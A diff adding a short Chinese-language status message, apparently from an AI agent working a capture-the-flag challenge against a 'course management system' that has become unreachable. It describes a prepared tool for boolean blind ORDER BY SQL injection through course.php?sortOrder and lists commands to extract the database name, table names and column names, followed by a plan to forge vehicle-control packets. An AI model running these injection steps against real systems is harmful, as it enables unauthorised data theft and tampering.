@@ -1,0 +1,19 @@
+10.119.6.32:8099 在我刚开始探测时能打开 /，返回一个“课程管理系统”首页；随后 course.php?sortOrder=... 一直超时，再之后连 / 本身都变成了 TCP 连接超时。我分别在沙箱内和提权后的网络里都复测过，结论一样，所以这会儿不是我们脚本的问题，而是靶机当前不可达。
+
+我已经把下一步的利用工具准备好了：vscp_sqli_helper.py。它是按这个思路写的：把 sortOrder 当成 ORDER BY 盲注点，用 if((条件),id,name) 这种 payload 通过排序结果做布尔判断，后面就能枚举库名、表名、列名，再把 VSCP 相关数据拉出来。
+
+服务一恢复，直接按这几步打就行：
+
+powershell
+
+
+
+python vscp_sqli_helper.py calibrate
+python vscp_sqli_helper.py check "1=1"
+python vscp_sqli_helper.py extract "database()"
+python vscp_sqli_helper.py extract "select table_name from information_schema.tables where table_schema=database() limit 0,1"
+python vscp_sqli_helper.py extract "select column_name from information_schema.columns where table_schema=database() and table_name='可疑表名' limit 0,1"
+
+
+
+我的判断是第一步漏洞大概率就是 course.php?sortOrder= 的 ORDER BY 注入。等端口回来后，我们下一步就不是再猜，而是直接把库里和用户身份、数据包、车辆控制相关的记录抽出来，然后据此解析 VSCP 包格式，再伪造控制包拿 flag。如果你现在能确认靶机已经恢复，我就继续把在线利用链跑完。
